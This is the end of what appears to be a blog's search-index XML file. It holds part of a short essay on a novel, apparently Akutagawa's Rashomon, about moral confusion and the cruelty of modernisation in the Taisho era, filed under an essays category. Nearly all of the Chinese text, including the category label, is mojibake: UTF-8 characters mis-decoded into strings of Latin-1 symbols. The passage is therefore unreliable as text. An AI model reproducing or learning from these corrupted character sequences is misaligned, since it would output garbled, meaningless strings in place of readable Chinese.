é€’ä¸æ‰©æ•£ï¼Œå¤„äºå½“æ—¶çš„æ—¶ä»£èƒŒæ™¯ä¸‹äººä»¬çš„ä»·å€¼è§‚æ··ä¹±ä»¥åŠå¼±è‚‰å¼ºé£Ÿçš„ä¸›æ—æ³•åˆ™åœ¨åº•å±‚ç¤¾ä¼šçš„èµ¤è£¸å‘ˆç°ï¼Œç°ä»£åŒ–è¿›ç¨‹ä¸­å¯¹åº•å±‚äººæ°‘çš„æ®‹é…·æ€§ã€‚</p><p>åœ¨çœ‹çš„æ—¶å€™ä»ä¸€å¼€å§‹å°±æ„Ÿå—åˆ°äº†å°è¯´çš„ç‹‚æš´å’Œå‹æŠ‘çš„æ°›å›´ï¼Œä¸ç®¡æ˜¯åœ°éœ‡ã€å¸ƒæ»¡å¤©ç©ºçš„ä¹Œé¸¦ã€ç‹‚é£æš´é›¨ï¼Œå„ç§ç¯å¢ƒæ°›å›´ä»£è¡¨ç€å¤§æ­£æ—¶ä»£è¡¨é¢çš„æ°‘ä¸»æµªæ½®ä¸‹ï¼Œç¤¾ä¼šçŸ›ç›¾ã€æ”¿æ²»æš—æµå¸¦æ¥çš„ä¸å®‰ä¸çª’æ¯æ„Ÿï¼Œå‹çš„äººå–˜ä¸è¿‡æ¥æ°”ï¼ŒåŒæ—¶å¸ƒæ»¡å¤©ç©ºçš„ä¹Œé¸¦å’Œé»‘å¤œæ›´ä»£è¡¨ç€é»‘å¤œé®è”½è§†çº¿ï¼Œæ¨¡ç³Šäº†å–„æ¶ç•Œé™ï¼Œé‚£ä¸ªæ—¶ä»£çš„ä»·å€¼æ ‡å‡†çš„æ··ä¹±å¯¼è‡´çš„ç¤¾ä¼šæ™®éæ€§é“å¾·å¤±èŒƒä¸åˆ¤æ–­å›°éš¾ã€‚ä»†äººæœ€ç»ˆæ¶ˆå¤±åœ¨â€œé»‘å¤œæ·±å¤„â€ï¼Œè¡¨æ˜é‚£ä¸ªå¹´ä»£çš„ä¸ªä½“ä¹ƒè‡³æ•´ä¸ªç¤¾ä¼šåœ¨å‰§å˜æ—¶ä»£ä¸­å¯¹å‰è·¯çš„è¿·èŒ«ä¸æœªçŸ¥çš„ææƒ§ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
